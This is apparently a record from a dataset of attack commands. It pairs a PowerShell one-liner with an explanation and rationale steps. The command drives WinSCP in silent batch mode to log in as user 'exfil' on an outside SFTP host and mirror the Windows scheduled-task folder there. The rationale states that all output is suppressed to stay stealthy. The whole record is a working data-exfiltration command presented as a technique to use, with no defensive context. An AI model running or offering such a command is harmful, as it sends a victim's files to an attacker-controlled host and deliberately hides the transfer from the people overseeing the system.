command: $r="/tasks/"; & 'C:\Program Files (x86)\WinSCP\WinSCP.com' /ini=nul /command 'option batch on' 'option confirm off' 'open sftp://exfil:S3cr3t!@198.51.100.80/ -hostkey="ssh-ed25519 255 SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="' ("synchronize remote C:\Windows\Tasks `"$r`" -criteria=time -filemask=`"|*.tmp;|*.log`"") 'exit' | Out-Null 2>$null
explanation: Uses WinSCP's synchronize mode to automatically mirror scheduled task files to a remote SFTP location while excluding noisy extensions.
rationale_steps: Connect via SFTP with host key pinning in batch mode
Synchronize remote with timestamp comparison only
Suppress all output to remain stealthy
